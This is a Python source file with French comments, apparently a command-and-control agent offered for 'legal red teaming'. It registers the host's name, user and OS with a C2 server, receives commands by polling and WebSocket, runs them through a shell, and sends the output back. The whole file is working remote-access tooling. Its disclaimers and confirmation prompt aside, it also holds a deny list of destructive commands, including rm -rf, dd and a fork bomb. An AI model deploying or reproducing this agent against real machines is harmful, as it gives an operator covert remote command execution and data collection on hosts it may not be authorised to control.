#!/usr/bin/env python3
"""
Agent C2 Client pour tests internes et red teaming légal
USAGE LÉGAL UNIQUEMENT - Tests de sécurité autorisés
"""

import requests
import json
import time
import subprocess
import platform
import socket
import getpass
import os
import base64
import threading
from datetime import datetime
import socketio

class C2Agent:
    def __init__(self, c2_server_url):
        self.c2_server_url = c2_server_url.rstrip('/')
        self.agent_id = None
        self.encryption_key = None
        self.running = False
        self.sio = None
        
        # Informations système
        self.hostname = socket.gethostname()
        self.username = getpass.getuser()
        self.os_info = f"{platform.system()} {platform.release()}"
        self.capabilities = [
            'command_execution',
            'file_operations',
            'system_info',
            'network_discovery'
        ]
    
    def register(self):
        """Enregistrement auprès du serveur C2"""
        try:
            registration_data = {
                'hostname': self.hostname,
                'username': self.username,
                'os_info': self.os_info,
                'capabilities': self.capabilities
            }
            
            response = requests.post(
                f"{self.c2_server_url}/api/agent/register",
                json=registration_data,
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                self.agent_id = data['agent_id']
                self.encryption_key = data['encryption_key']
                
                print(f"[✅] Agent enregistré avec succès")
                print(f"[ℹ️] Agent ID: {self.agent_id}")
                return True
            else:
                print(f"[❌] Erreur d'enregistrement: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[❌] Erreur de connexion: {e}")
            return False
    
    def connect_websocket(self):
        """Connexion WebSocket pour communication temps réel"""
        try:
            self.sio = socketio.Client()
            
            @self.sio.event
            def connect():
                print("[✅] WebSocket connecté")
                self.sio.emit('join_agent', {'agent_id': self.agent_id})
            
            @self.sio.event
            def disconnect():
                print("[⚠️] WebSocket déconnecté")
            
            @self.sio.event
            def new_command(data):
                print(f"[📨] Nouvelle commande reçue: {data['command']}")
                result = self.execute_command(data['command'])
                self.submit_result(data['command_id'], result)
            
            self.sio.connect(self.c2_server_url)
            return True
            
        except Exception as e:
            print(f"[❌] Erreur WebSocket: {e}")
            return False
    
    def checkin(self):
        """Check-in périodique avec le serveur"""
        try:
            response = requests.post(
                f"{self.c2_server_url}/api/agent/{self.agent_id}/checkin",
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                commands = data.get('commands', [])
                
                print(f"[📡] Check-in réussi - {len(commands)} commande(s) en attente")
                
                # Exécuter les commandes en attente
                for cmd in commands:
                    print(f"[⚡] Exécution: {cmd['command']}")
                    result = self.execute_command(cmd['command'])
                    self.submit_result(cmd['id'], result)
                
                return True
            else:
                print(f"[❌] Check-in échoué: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[❌] Erreur check-in: {e}")
            return False
    
    def execute_command(self, command):
        """Exécution sécurisée des commandes"""
        try:
            print(f"[⚡] Exécution: {command}")
            
            # Commandes système sécurisées
            if command.startswith('cd '):
                try:
                    path = command[3:].strip()
                    os.chdir(path)
                    return f"Répertoire changé vers: {os.getcwd()}"
                except Exception as e:
                    return f"Erreur cd: {str(e)}"
            
            # Commandes système standard
            elif command in ['pwd', 'whoami', 'hostname']:
                if command == 'pwd':
                    return os.getcwd()
                elif command == 'whoami':
                    return getpass.getuser()
                elif command == 'hostname':
                    return socket.gethostname()
            
            # Info système
            elif command == 'sysinfo':
                info = {
                    'hostname': socket.gethostname(),
                    'username': getpass.getuser(),
                    'os': platform.system(),
                    'release': platform.release(),
                    'architecture': platform.architecture()[0],
                    'processor': platform.processor(),
                    'python_version': platform.python_version()
                }
                return json.dumps(info, indent=2)
            
            # Commandes shell génériques (avec restrictions)
            else:
                # Liste des commandes dangereuses interdites
                forbidden_commands = [
                    'rm -rf', 'format', 'del /f', 'shutdown', 'reboot',
                    'mkfs', 'dd if=', ':(){ :|:& };:', 'chmod 777 /'
                ]
                
                # Vérifier les commandes interdites
                if any(forbidden in command.lower() for forbidden in forbidden_commands):
                    return "❌ Commande interdite pour des raisons de sécurité"
                
                # Exécuter la commande avec timeout
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30,
                    cwd=os.getcwd()
                )
                
                output = result.stdout
                if result.stderr:
                    output += f"\nSTDERR: {result.stderr}"
                
                return output if output else f"Commande exécutée (code de retour: {result.returncode})"
                
        except subprocess.TimeoutExpired:
            return "❌ Timeout: Commande interrompue après 30 secondes"
        except Exception as e:
            return f"❌ Erreur d'exécution: {str(e)}"
    
    def submit_result(self, command_id, result):
        """Soumission du résultat d'une commande"""
        try:
            response = requests.post(
                f"{self.c2_server_url}/api/agent/{self.agent_id}/result",
                json={
                    'command_id': command_id,
                    'result': result
                },
                timeout=10
            )
            
            if response.status_code == 200:
                print(f"[✅] Résultat envoyé pour la commande {command_id}")
                return True
            else:
                print(f"[❌] Erreur envoi résultat: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[❌] Erreur soumission: {e}")
            return False
    
    def run(self):
        """Boucle principale de l'agent"""
        print(f"🚀 Démarrage de l'agent C2")
        print(f"🎯 Serveur: {self.c2_server_url}")
        print(f"💻 Hôte: {self.hostname} ({self.username})")
        print(f"🖥️ OS: {self.os_info}")
        print("⚠️ USAGE LÉGAL UNIQUEMENT - Tests de sécurité autorisés")
        print("-" * 60)
        
        # Enregistrement
        if not self.register():
            print("[❌] Impossible de s'enregistrer. Arrêt.")
            return
        
        # Connexion WebSocket (optionnelle)
        websocket_connected = self.connect_websocket()
        if websocket_connected:
            print("[✅] Mode temps réel activé")
        else:
            print("[⚠️] Mode polling uniquement")
        
        self.running = True
        
        try:
            while self.running:
                # Check-in périodique (même en mode WebSocket pour la robustesse)
                self.checkin()
                
                # Attendre avant le prochain check-in
                time.sleep(30)  # Check-in toutes les 30 secondes
                
        except KeyboardInterrupt:
            print("\n[🛑] Arrêt demandé par l'utilisateur")
        except Exception as e:
            print(f"[❌] Erreur fatale: {e}")
        finally:
            self.stop()
    
    def stop(self):
        """Arrêt propre de l'agent"""
        print("[🛑] Arrêt de l'agent...")
        self.running = False
        
        if self.sio and self.sio.connected:
            self.sio.disconnect()
        
        print("[✅] Agent arrêté")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Agent C2 pour tests de sécurité légaux')
    parser.add_argument('--server', default='http://localhost:5000', 
                       help='URL du serveur C2 (défaut: http://localhost:5000)')
    parser.add_argument('--test', action='store_true',
                       help='Mode test avec commandes automatiques')
    
    args = parser.parse_args()
    
    # Bannière de sécurité
    print("=" * 60)
    print("🛡️ AGENT C2 POUR TESTS DE SÉCURITÉ LÉGAUX")
    print("⚠️ Usage autorisé uniquement pour:")
    print("   • Tests de sécurité internes")
    print("   • Exercices Red Team autorisés")
    print("   • Recherche en cybersécurité")
    print("=" * 60)
    
    # Demander confirmation
    confirm = input("\nConfirmez-vous l'usage légal et autorisé? (oui/non): ")
    if confirm.lower() not in ['oui', 'yes', 'y', 'o']:
        print("❌ Usage non confirmé. Arrêt.")
        return
    
    # Créer et lancer l'agent
    agent = C2Agent(args.server)
    
    if args.test:
        print("\n🧪 Mode test activé - Commandes automatiques après 10 secondes")
        
        def test_commands():
            time.sleep(10)
            test_cmds = ['whoami', 'pwd', 'sysinfo', 'ls -la' if os.name != 'nt' else 'dir']
            
            for cmd in test_cmds:
                if agent.agent_id:
                    print(f"\n🧪 Test automatique: {cmd}")
                    result = agent.execute_command(cmd)
                    print(f"Résultat: {result}")
                time.sleep(5)
        
        # Lancer les tests en arrière-plan
        test_thread = threading.Thread(target=test_commands)
        test_thread.daemon = True
        test_thread.start()
    
    # Lancer l'agent
    agent.run()

if __name__ == '__main__':
    main()
